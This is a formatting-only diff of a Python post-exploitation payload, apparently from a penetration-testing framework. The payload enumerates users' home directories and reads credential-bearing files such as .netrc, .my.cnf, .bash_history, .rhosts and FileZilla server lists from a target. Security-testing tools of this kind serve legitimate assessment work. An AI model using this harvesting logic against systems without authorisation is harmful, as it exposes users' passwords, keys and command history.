@@ -4,10 +4,10 @@ from core.ui.console.tables import table
 
 class users_config_files(base_payload):
     '''
-    This payload uses "users_folders" payload to find ".rc" and other configuration files, 
+    This payload uses "users_folders" payload to find ".rc" and other configuration files,
     some of them may contain sensitive information.
     '''
-    
+
     def fname_generator(self):
         users_result = self.exec_payload('users')
 
@@ -22,47 +22,47 @@ class users_config_files(base_payload):
         # #TODO PUT IN APACHE
         # users_config_files.append('/etc/libapache2-mod-jk/workers.properties')
         #=======================================================================
-        
+
         files = ['.bashrc', '.bashrc~', '.bash_history', '.bash_profile',
-         '.gtk-bookmarks', '.conkyrc', '.my.cnf', '.mysql_history',
-         '.ldaprc ', '.emacs', '.bash_logout', '.bash_login ',
-         '.hushlogin', '.mail.rc', '.profile', '.vimrc', '.gtkrc',
-         '.kderc', '.netrc', '.rhosts', '.Xauthority', '.cshrc',
-         '.login', '.joe_state',
-         
-         # TODO: Should I move this to a separate payload?
-         '.filezilla/filezilla.xml', '.filezilla/recentservers.xml',
-         '.filezilla/sitemanager.xml',
-         
-         ]
-        
+                 '.gtk-bookmarks', '.conkyrc', '.my.cnf', '.mysql_history',
+                 '.ldaprc ', '.emacs', '.bash_logout', '.bash_login ',
+                 '.hushlogin', '.mail.rc', '.profile', '.vimrc', '.gtkrc',
+                 '.kderc', '.netrc', '.rhosts', '.Xauthority', '.cshrc',
+                 '.login', '.joe_state',
+
+                 # TODO: Should I move this to a separate payload?
+                 '.filezilla/filezilla.xml', '.filezilla/recentservers.xml',
+                 '.filezilla/sitemanager.xml',
+
+                 ]
+
         for user in users_result:
             home = users_result[user]['home']
-            
+
             for filename in files:
                 yield home + filename
-        
+
     def api_read(self):
         result = {}
 
         for file_, content in self.read_multi(self.fname_generator()):
             if content:
-                result[ file_ ] = content
-                
+                result[file_] = content
+
         return result
-        
+
     def run_read(self):
         api_result = self.api_read()
-                
+
         if not api_result:
             return 'No user configuration files found.'
         else:
             rows = []
-            rows.append( ['User configuration files',] )
-            rows.append( [] )
+            rows.append(['User configuration files', ])
+            rows.append([])
             for filename in api_result:
-                rows.append( [filename,] )
-                    
-            result_table = table( rows )
-            result_table.draw( 80 )
+                rows.append([filename, ])
+
+            result_table = table(rows)
+            result_table.draw(80)
             return rows
